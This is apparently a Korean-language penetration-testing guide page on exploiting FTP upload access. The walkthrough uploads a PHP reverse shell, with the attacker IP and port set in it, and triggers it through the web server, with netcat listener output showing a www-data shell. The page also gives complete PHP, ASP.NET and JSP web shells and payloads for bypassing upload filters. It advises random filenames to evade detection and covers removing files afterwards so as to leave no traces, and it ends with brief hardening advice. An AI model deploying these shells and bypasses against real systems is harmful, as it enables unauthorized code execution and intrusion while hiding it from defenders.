---
sidebar_position: 1
title: FTP Exploitation
---

# FTP 취약점 공격

## 개요

FTP 서비스의 업로드/다운로드 권한과 다른 서비스와의 연계를 통한 공격

**핵심 공격 조건**:
1. FTP 파일 업로드 가능
2. 업로드된 파일을 다른 서비스(HTTP, SMB 등)로 실행 가능

**공격 논리**:
> FTP로 악성 파일 업로드 → 웹 서버 등으로 실행 → 원격 코드 실행 (RCE)

---

## 공격 시나리오

### 시나리오 1: FTP + 웹 서버

**조건**:
- FTP와 웹 서버가 같은 디렉토리 공유
- 익명 로그인 또는 약한 계정
- 파일 업로드 권한

**공격**:
1. FTP로 PHP 리버스 쉘 업로드
2. 웹 브라우저로 업로드한 파일 접속
3. 리버스 쉘 획득

---

## 공격 단계

### 1. PHP 리버스 쉘 준비

```bash
# 칼리 기본 리버스 쉘 복사
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# IP와 포트 수정
vim shell.php
```

**수정 내용** (45-55번째 줄):
```php
$ip = '10.8.0.2';    # 공격자 IP
$port = 1234;        # 리스닝 포트
```

### 2. FTP로 파일 업로드

```bash
# FTP 접속
ftp <target>

# 익명 로그인
Name: anonymous
Password: (Enter 또는 이메일)

# 업로드 가능 디렉토리 확인
ftp> ls -la
ftp> cd uploads

# 파일 업로드
ftp> put shell.php

# 업로드 확인
ftp> ls -la
```

**파일명 권장사항**:
```bash
# 랜덤한 파일명 사용 (탐지 회피)
mv shell.php abc8j32kf.php

# 이유:
# - 브루트포스 스캐너 회피
# - 다른 사용자 우연한 발견 방지
```

### 3. 업로드 경로 확인

FTP 업로드 경로와 웹 서버 경로 매핑:

```bash
# FTP 경로
ftp> pwd
# 257 "/uploads" is current directory

# 웹 서버 추측
# http://target/uploads/shell.php
# http://target/ftp/uploads/shell.php
# http://target/shell.php
```

### 4. 리버스 쉘 실행

```bash
# 1. 리스너 시작
nc -lvnp 1234

# 2. 웹 브라우저로 접속
http://<target>/uploads/shell.php

# 또는 cURL
curl http://<target>/uploads/shell.php
```

**결과**:
```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.0.2] from (UNKNOWN) [192.168.1.10] 40714

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data
```

---

## FTP 진단 핵심 질문

공격 가능성 판단을 위한 4가지 질문:

### 1. 다운로드 가능한 파일은?
```bash
ftp> ls -la
ftp> get config.php
ftp> get .bash_history
```

**타겟**: 설정 파일, 히스토리, SSH 키 등

### 2. 업로드 가능한 파일은?
```bash
ftp> put test.txt
ftp> put shell.php
ftp> put shell.aspx
```

**확인**: 파일 타입 제한, 확장자 필터

### 3. 업로드 경로는?
```bash
ftp> pwd
ftp> ls -la

# 웹 경로 추측
http://target/test.txt
http://target/uploads/test.txt
http://target/ftp/test.txt
```

### 4. 다른 서비스로 실행 가능한가?
- HTTP: PHP, ASP, JSP 등 서버 사이드 스크립트
- SMB: 공유 폴더를 통한 실행
- NFS: 마운트 후 실행

---

## 다양한 웹 쉘

### PHP 웹 쉘

```php
<?php system($_GET['cmd']); ?>
```

**사용**:
```bash
http://target/shell.php?cmd=whoami
http://target/shell.php?cmd=ls%20-la
```

### ASP.NET 웹 쉘

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Response.Write("<pre>" + 
        Server.HtmlEncode(RunCmd(Request["cmd"])) + 
        "</pre>");
}
string RunCmd(string cmd) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    return p.StandardOutput.ReadToEnd();
}
</script>
```

### JSP 웹 쉘

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
%>
```

---

## 우회 기법

### 파일 확장자 필터 우회

```bash
# 대소문자 변경
shell.PHP
shell.Php
shell.pHp

# 더블 확장자
shell.php.jpg
shell.jpg.php

# Null Byte (PHP < 5.3)
shell.php%00.jpg

# 특수 문자 추가
shell.php;.jpg
shell.php .jpg
```

### 파일 타입 검증 우회

```bash
# 매직 바이트 추가 (GIF)
GIF89a;<?php system($_GET['cmd']); ?>

# JPEG 매직 바이트
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
```

---

## 주요 명령어 요약

```bash
# PHP 리버스 쉘 복사
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# FTP 익명 로그인
ftp <target>
> anonymous
> (Enter)

# 파일 업로드
ftp> put shell.php

# 파일 다운로드
ftp> get config.php

# 리스너
nc -lvnp <port>

# 웹으로 실행
curl http://<target>/shell.php
```

## 공격 후 정리

```bash
# 업로드한 파일 삭제
ftp> delete shell.php

# 웹 쉘 삭제 (리버스 쉘에서)
rm /var/www/html/shell.php

# 로그 확인 (흔적 남기지 않기)
# - FTP 로그: /var/log/vsftpd.log
# - 웹 로그: /var/log/apache2/access.log
```

## 실무 팁

1. ✅ **랜덤 파일명 사용** - 탐지 회피
2. ✅ **권한 확인** - 업로드 후 실행 가능 여부
3. ✅ **다중 업로드** - 하나 실패 시 다른 경로 시도
4. ✅ **로그 모니터링** - 업로드 즉시 로그 확인
5. ✅ **즉시 정리** - 공격 완료 후 파일 삭제
6. ✅ **문서화** - 모든 행위 기록

## 보안 권장사항

1. ❌ 익명 로그인 비활성화
2. ❌ FTP 비활성화, SFTP/SCP 사용
3. ✅ 업로드 디렉토리 실행 권한 제거
4. ✅ 파일 타입 화이트리스트
5. ✅ 업로드 파일 스캔
6. ✅ FTP와 웹 서버 분리
